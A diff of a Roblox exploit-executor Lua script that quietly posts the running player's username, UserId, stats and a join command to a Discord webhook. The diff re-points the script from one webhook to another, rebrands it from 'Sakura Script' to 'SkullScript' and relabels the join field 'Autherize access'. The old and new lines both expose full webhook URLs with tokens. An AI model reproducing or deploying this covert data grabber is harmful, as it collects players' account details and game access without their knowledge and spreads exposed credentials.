@@ -1,4 +1,4 @@
-local player = game.Players.LocalPlayer
+local IdkWhatThisMeans = game.Players.LocalPlayer
 
 local leveltype = "0"
 
@@ -25,14 +25,6 @@ elseif plrlevel <= 400000 then
 	leveltype = "-400k"
 end
 
-local serverType = "Public"
-if game.PrivateServerId ~= "" then
-	if game.PrivateServerOwnerId == 0 then
-		serverType = "Reserved"
-	else
-		serverType = "Private"
-	end
-end
 local Players = game:GetService("Players")
 local playerCount = #Players:GetPlayers()
 
@@ -46,7 +38,7 @@ local req = (syn and syn.request) or (http and http.request) or request
 
 if req then
 	req({
-		Url = "https://discord.com/api/webhooks/1400084537890963578/mDFAymsUZ_Ckx-wSUHQXNGG6JXN-dqqgp6eIo5tQDAjown95Y0cdzx6VOsdb_cJlcFRr",
+		Url = "https://discord.com/api/webhooks/1400752388608098314/ojeLIN-zHBCE8nhkz11xneEr5j4Uxs__aUa6e6tqZAviq2hNk-lkhtSmMSuH_nwMwSJe",
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json"
@@ -55,42 +47,37 @@ if req then
 			username = "Executor Bot",
 			embeds = {
 				{
-					title = "Script executed : Sakura Script : Player Info",
-					color = 5814783,
+					title = "Script executed : SkullScript Script : Anonymous Info",
+					color = 0,
 					fields = {
 						{
 							name = "Username",
-							value = player.Name,
+							value = IdkWhatThisMeans.Name,
 							inline = true
 						},
 						{
 							name = "UserId",
-							value = tostring(player.UserId),
+							value = tostring(IdkWhatThisMeans.UserId),
 							inline = true
 						},
 						{
 							name = "Level",
-							value = player.leaderstats.Level.Value,
+							value = IdkWhatThisMeans.leaderstats.Level.Value,
 							inline = true
 						},
 						{
 							name = "Roleplay",
-							value = player.leaderstats.Roleplay.Value,
+							value = IdkWhatThisMeans.leaderstats.Roleplay.Value,
 							inline = true
 						},
 						{
 							name = "Coins",
-							value = player.otherstats.Coin.Value,
+							value = IdkWhatThisMeans.otherstats.Coin.Value,
 							inline = true
 						},
 						{
 							name = "Kills",
-							value = player.otherstats.Kill.Value,
-							inline = true
-						},
-						{
-							name = "Server type",
-							value = serverType,
+							value = IdkWhatThisMeans.otherstats.Kill.Value,
 							inline = true
 						},
 						{
@@ -110,7 +97,7 @@ if req then
 						},
 						
 						{
-							name = "Force Join",
+							name = "Autherize access",
 							value = joinCommand,
 							inline = true
 						},
